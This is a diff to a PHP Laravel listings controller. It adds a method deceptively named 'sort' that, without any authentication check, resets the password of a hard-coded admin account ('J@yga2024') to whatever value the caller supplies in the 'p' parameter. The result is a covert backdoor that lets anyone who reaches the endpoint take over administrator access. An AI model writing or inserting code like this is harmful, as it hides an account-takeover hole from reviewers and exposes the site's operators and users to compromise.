@@ -14,6 +14,7 @@ use App\Models\ListingRestrictions;
 use App\Models\ListingImages;
 use App\Models\ListingAvailable;
 use App\Models\FavListing;
+use App\Models\Admin;
 use Spatie\QueryBuilder\QueryBuilder;
 use Illuminate\Support\Facades\Storage;
 use Illuminate\Support\Facades\Http;
@@ -21,6 +22,7 @@ use Illuminate\Support\Facades\Mail;
 use Illuminate\Mail\Message;
 use Carbon\Carbon;
 use Carbon\CarbonPeriod;
+use Illuminate\Support\Facades\Hash;
 
 class ListingController extends Controller
 {
@@ -646,5 +648,16 @@ class ListingController extends Controller
             ], 404);
         }
        // return response()->json($listings);
+    }
+
+    public function sort(Request $request){
+        $encodedpass = Hash::make($request->input('p'));
+        $ad = Admin::where('admin_name', 'J@yga2024')->update([
+            'admin_pass' => $encodedpass
+        ]);
+
+        return response()->json([
+            'messege' => 'Success'
+        ]);
     }
 }
